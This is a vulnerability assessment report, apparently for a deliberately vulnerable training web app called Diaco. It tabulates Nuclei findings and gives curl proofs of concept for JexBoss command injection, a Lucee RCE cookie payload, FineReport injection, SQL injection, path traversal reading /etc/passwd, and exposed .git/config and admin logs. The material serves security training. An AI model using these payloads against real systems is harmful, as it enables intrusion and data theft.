# Diaco System Security Assessment Report

## System Overview
Diaco is an intentionally vulnerable web application designed for educational purposes in cybersecurity training. The system is built using:
- PHP 8.0.30
- Apache 2.4.56
- MySQL Database
- Various vulnerable components for demonstration

The application includes multiple intentionally implemented vulnerabilities across different components to demonstrate common web application security issues. These vulnerabilities are implemented to help security professionals and students understand:
- How vulnerabilities are exploited
- Impact of security flaws
- Methods of vulnerability detection
- Security best practices

## Nuclei Scan Results

### Vulnerability Summary

| Severity | Count | Description |
|----------|-------|-------------|
| Critical | 3 | Remote Code Execution and SQL Injection vulnerabilities |
| High | 2 | SQL Injection and Path Traversal vulnerabilities |
| Medium | 1 | Information Disclosure vulnerability |
| Low | 1 | Information Disclosure vulnerability |
| Info | 3 | Server and form detection findings |

## Critical Vulnerabilities

| Vulnerability | Type | CVSS | URL | Impact |
|--------------|------|------|-----|--------|
| JexBoss Backdoor RCE | Remote Code Execution | 9.8 | `http://127.0.0.1:3300/jexws4/jexws4.jsp?ppp=cat+%2Fetc%2Fpasswd` | System compromise |
| Lucee RCE | Remote Code Execution | 9.8 | `http://127.0.0.1:3300` | System compromise |
| FineReport SQLi to RCE | SQL Injection | 9.8 | `http://127.0.0.1:3300/webroot/decision/view/ReportServer?accaabcc&n=${sum(1024,123)}` | Database compromise |

## High Severity Vulnerabilities

| Vulnerability | Type | CVSS | URL | Impact |
|--------------|------|------|-----|--------|
| 74CMS Weixin SQL Injection | SQL Injection | 8.8 | `http://127.0.0.1:3300/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp&nonce` | Database access |
| FLIR Path Traversal | Path Traversal | 7.5 | `http://127.0.0.1:3300/download.php?file=/etc/passwd` | File system access |

## Medium Severity Vulnerabilities

| Vulnerability | Type | CVSS | URL | Impact |
|--------------|------|------|-----|--------|
| Git Config Exposure | Information Disclosure | 5.3 | `http://127.0.0.1:3300/.git/config` | Repository information exposure |

## Low Severity Vulnerabilities

| Vulnerability | Type | CVSS | URL | Impact |
|--------------|------|------|-----|--------|
| BSPHP Information Disclosure | Information Disclosure | 3.1 | `http://127.0.0.1:3300/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log` | User login logs exposure |

## Informational Findings

| Finding | Type | URL | Details |
|---------|------|-----|---------|
| Form Detection | Information | `http://127.0.0.1:3300` | Multiple input forms detected |
| Apache Server | Information | `http://127.0.0.1:3300` | Apache/2.4.56 (Debian) |
| PHP Version | Information | `http://127.0.0.1:3300` | PHP 8.0.30 |

## Vulnerability Details

### Critical Vulnerabilities

#### 1. JexBoss Backdoor RCE
**Description**: Unauthenticated command injection vulnerability in JexBoss component
**Proof of Concept**:
```bash
curl "http://127.0.0.1:3300/jexws4/jexws4.jsp?ppp=id"
```

#### 2. Lucee RCE
**Description**: Remote code execution vulnerability in Lucee CFML engine
**Proof of Concept**:
```bash
curl -H "Cookie: CF_CLIENT_=render{cfscript}writeoutput(ToBinary('base64_payload'))" http://127.0.0.1:3300
```

#### 3. FineReport SQLi to RCE
**Description**: SQL injection vulnerability in FineReport leading to RCE
**Proof of Concept**:
```bash
curl "http://127.0.0.1:3300/webroot/decision/view/ReportServer?accaabcc&n=${sum(1024,123)}"
```

### High Severity Vulnerabilities

#### 4. 74CMS Weixin SQL Injection
**Description**: SQL injection vulnerability in 74CMS Weixin component
**Proof of Concept**:
```bash
curl "http://127.0.0.1:3300/plus/weixin.php?signature=1' OR '1'='1"
```

#### 5. FLIR Path Traversal
**Description**: Directory traversal vulnerability in FLIR component
**Proof of Concept**:
```bash
curl "http://127.0.0.1:3300/download.php?file=../../../../etc/passwd"
```

### Medium Severity Vulnerabilities

#### 6. Git Config Exposure
**Description**: Exposure of Git configuration file
**Proof of Concept**:
```bash
curl http://127.0.0.1:3300/.git/config
```

### Low Severity Vulnerabilities

#### 7. BSPHP Information Disclosure
**Description**: Information disclosure vulnerability in BSPHP admin panel
**Proof of Concept**:
```bash
curl "http://127.0.0.1:3300/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log"
```

## Testing Environment
- Base URL: http://127.0.0.1:3300
- Server: Apache/2.4.56 (Debian)
- PHP Version: 8.0.30
- Scan Tool: Nuclei

## Disclaimer
This report is for educational purposes only. The vulnerabilities described are intentionally implemented for learning and should not be used in production environments. 